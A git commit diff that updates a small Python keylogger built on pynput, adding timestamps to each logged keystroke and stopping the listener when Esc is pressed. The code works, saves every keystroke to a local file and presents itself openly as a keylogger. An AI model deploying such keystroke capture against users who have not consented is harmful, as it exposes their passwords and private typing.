a04f949ead44d6bda3ce65734a3d62eb623bf890
Zaid Arif <zaid.zrf@gmail.com>
2024-10-17 19:16:34 +0530

    add timestamp to keylogs and set Esc key as termination

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,15 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
+from datetime import datetime
 
 def writeToFile(key):
     keyData = str(key)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 
     with open("logs.txt", "a") as file:
-        file.write(keyData)
+        file.write(f"{timestamp}: {keyData}\n")
 
-with Listener(on_press=writeToFile) as myListener:
+def onRelease(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=writeToFile, on_release=onRelease) as myListener:
     myListener.join()
